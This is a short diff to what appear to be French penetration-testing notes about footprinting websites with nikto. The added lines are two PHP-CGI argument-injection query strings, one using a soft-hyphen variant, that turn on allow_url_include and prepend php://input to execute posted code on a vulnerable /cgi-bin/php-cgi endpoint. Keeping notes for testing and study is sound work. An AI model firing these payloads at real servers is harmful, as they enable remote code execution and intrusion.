@@ -42,3 +42,6 @@ On utilise nikto pour footprinter les siteweb:
 ![[IMG-20260116031357685.png]]
 
 /cgi-bin/php-cgi
+
+?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
+?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
